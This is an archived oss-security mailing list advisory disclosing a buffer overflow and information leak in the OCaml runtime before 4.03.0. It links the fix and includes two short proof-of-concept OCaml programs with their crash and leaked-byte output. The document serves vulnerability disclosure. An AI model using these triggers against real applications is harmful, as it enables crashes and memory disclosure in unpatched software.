X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2097" "Friday" "29" "April" "2016" "00:18:22" "+0000" "Pascal Cuoq" "cuoq@trust-in-soft.com" "<4868d0749e044d6491f11118f6e10d45@S1688.EX1688.lan>" "78" "[oss-security] buffer overflow and information leak in OCaml < 4.03.0" nil nil nil "4" "2016042900:18:22" "[oss-security] buffer overflow and information leak in OCaml < 4.03.0" (number mark "U       cuoq@trust-i Apr 29   78/2097  " thread-indent "\"[oss-security] buffer overflow and information leak in OCaml < 4.03.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20291 invoked by uid 550); 29 Apr 2016 00:17:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20269 invoked from network); 29 Apr 2016 00:17:17 -0000
From: Pascal Cuoq <cuoq@trust-in-soft.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
CC: "cve-assign@mitre.org" <cve-assign@mitre.org>
Thread-Topic: buffer overflow and information leak in OCaml < 4.03.0
Thread-Index: AQHRoaqflc3FnbtpBkiX5EyF32YZ0w==
Date: Fri, 29 Apr 2016 00:18:22 +0000
Message-ID: <4868d0749e044d6491f11118f6e10d45@S1688.EX1688.lan>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-originating-ip: [78.250.69.11]
Content-Type: multipart/alternative;
	boundary="_000_4868d0749e044d6491f11118f6e10d45S1688EX1688lan_"
MIME-Version: 1.0
Subject: [oss-security] buffer overflow and information leak in OCaml < 4.03.0

--_000_4868d0749e044d6491f11118f6e10d45S1688EX1688lan_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

OCaml versions 4.02.3 and earlier have a runtime bug that, on 64-bit platfo=
rms, causes sizes arguments to an internal memmove call to be sign-extended=
 from 32 to 64-bits before being passed to the memmove function.

This leads arguments between 2GiB and 4GiB to be interpreted as larger than=
 they are (specifically, a bit below 2^64), causing a buffer overflow.

Arguments between 4GiB and 6GiB are interpreted as 4GiB smaller than they s=
hould be, causing a possible information leak.

This commit fixes the bug: https://github.com/ocaml/ocaml/commit/659615c7b1=
00a89eafe6253e7a5b9d84d0e8df74#diff-a97df53e3ebc59bb457191b496c90762
The function caml_bit_string is called indirectly from such functions as St=
ring.copy. String.copy for instance is supposed to be a "safe" function for=
 which OCaml's memory safety guarantees apply.

Proof of concept:
- buffer overflow

Hexa:~ $ ocamlopt -v

The OCaml native-code compiler, version 4.00.1

Standard library directory: /usr/local/Frama-C/ocaml-4.00.1p/lib/ocaml

Hexa:~ $ cat buffer_ovflw.ml

open Printf


let s1 =3D String.make 0x80000003 'a';;

let () =3D Printf.printf "%c" s1.[1];;

let s2 =3D String.copy s1;;

let () =3D Printf.printf "%c" s2.[1];;

Hexa:~ $ ocamlopt buffer_ovflw.ml && ./a.out

Segmentation fault: 11

- information leak

Hexa:~ $ cat infoleak.ml

let s1 =3D String.make 0x100000003 'a';;

let () =3D Printf.printf "%c" s1.[1];;

let s2 =3D String.copy s1;;

let () =3D

  for i =3D 4 to 40 do

    Printf.printf "%2x" (Char.code s2.[i]);

  done;

  Printf.printf "\n"

;;

Hexa:~ $ ocamlopt infoleak.ml && ./a.out

a 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0


OCaml applications, compiled with OCaml 4.02.3 or earlier on a 64-bit platf=
orm, that apply the defective copy functions to untrusted inputs are at ris=
k. These applications should be recompiled with OCaml 4.03.0.

--_000_4868d0749e044d6491f11118f6e10d45S1688EX1688lan_--
